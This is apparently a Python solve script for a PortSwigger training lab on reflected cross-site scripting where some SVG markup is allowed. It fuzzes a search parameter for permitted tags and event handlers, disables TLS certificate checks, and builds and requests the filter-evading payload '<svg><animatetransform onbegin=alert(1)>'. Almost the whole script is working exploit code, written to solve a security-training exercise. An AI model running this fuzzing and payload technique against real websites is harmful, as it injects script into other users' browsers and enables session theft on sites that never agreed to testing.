#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab: Reflected XSS with some SVG markup allowed
Constructs the payload URL using <svg><animatetransform onbegin=alert(1)>.
"""

import argparse
import requests
import sys
import urllib3
from urllib.parse import quote

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Common tags to test (subset — full list from PortSwigger XSS cheat sheet)
TAGS = [
    "a", "animate", "animatetransform", "audio", "b", "body", "br", "button",
    "canvas", "details", "div", "embed", "form", "h1", "hr", "iframe", "img",
    "input", "math", "meta", "object", "p", "script", "select", "svg",
    "table", "td", "textarea", "title", "video",
]

EVENTS = [
    "onbegin", "onend", "onrepeat", "onload", "onclick", "onfocus",
    "onmouseover", "onerror", "onanimationend", "onanimationstart",
    "onresize", "onscroll", "ontoggle",
]


def main():
    parser = argparse.ArgumentParser(
        description="Solve XSS Lab 16: Some SVG markup allowed"
    )
    parser.add_argument("lab_url", help="Lab URL (e.g. https://0aXX00...web-security-academy.net)")
    args = parser.parse_args()

    lab = args.lab_url.rstrip("/")
    s = requests.Session()
    s.verify = False

    # Step 1: Fuzz for allowed tags
    print("[*] Fuzzing for allowed tags...")
    allowed_tags = []
    for tag in TAGS:
        r = s.get(f"{lab}/?search=<{tag}>")
        if r.status_code == 200:
            allowed_tags.append(tag)
            print(f"  [+] Allowed: <{tag}>")

    if "svg" not in allowed_tags or "animatetransform" not in allowed_tags:
        print(f"[-] Expected <svg> + <animatetransform> — found: {allowed_tags}")
        print("    Manual investigation needed")
        sys.exit(1)

    # Step 2: Fuzz for allowed events on <svg><animatetransform>
    print("[*] Fuzzing for allowed events on <svg><animatetransform>...")
    allowed_events = []
    for event in EVENTS:
        r = s.get(f"{lab}/?search=<svg><animatetransform {event}=1>")
        if r.status_code == 200:
            allowed_events.append(event)
            print(f"  [+] Allowed: {event}")

    if "onbegin" not in allowed_events:
        print(f"[-] onbegin not allowed — try these events: {allowed_events}")
        sys.exit(1)

    # Step 3: Deliver the payload
    payload = "<svg><animatetransform onbegin=alert(1)>"
    exploit_url = f"{lab}/?search={quote(payload)}"
    print(f"\n[+] Exploit URL:\n    {exploit_url}")

    # Step 4: Check if lab is solved (visit the search URL)
    r = s.get(f"{lab}/?search={quote(payload)}")
    if "Congratulations" in r.text:
        print("[+] Lab solved!")
    else:
        print("[*] Open the exploit URL in a browser to trigger alert(1)")


if __name__ == "__main__":
    main()
